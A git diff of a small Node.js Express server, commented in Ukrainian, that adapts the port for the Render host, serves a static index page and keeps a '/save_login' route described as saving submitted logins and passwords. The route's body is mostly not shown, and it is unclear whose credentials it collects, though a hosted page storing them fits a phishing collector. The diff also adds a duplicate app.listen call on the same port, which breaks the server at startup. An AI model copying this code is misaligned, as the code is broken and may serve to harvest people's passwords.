@@ -1,9 +1,10 @@
-// server.js
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const app = express();
-const PORT = 3000;
+
+// Порт Render
+const PORT = process.env.PORT || 3000;
 
 // Дозволяємо парсити x-www-form-urlencoded
 app.use(express.urlencoded({ extended: true }));
@@ -11,7 +12,12 @@ app.use(express.urlencoded({ extended: true }));
 // Віддаємо статику (HTML, CSS, JS)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Маршрут для збереження логіну/пароля
+// Головна сторінка
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Збереження логіну/пароля
 app.post('/save_login', (req, res) => {
     const { username, password } = req.body;
     if (!username || !password) {
@@ -29,5 +35,11 @@ app.post('/save_login', (req, res) => {
 });
 
 app.listen(PORT, () => {
+    console.log(`Сервер запущено на порті ${PORT}`);
+});
+
+
+app.listen(PORT, () => {
     console.log(`Сервер запущено на http://localhost:${PORT}`);
 });
+
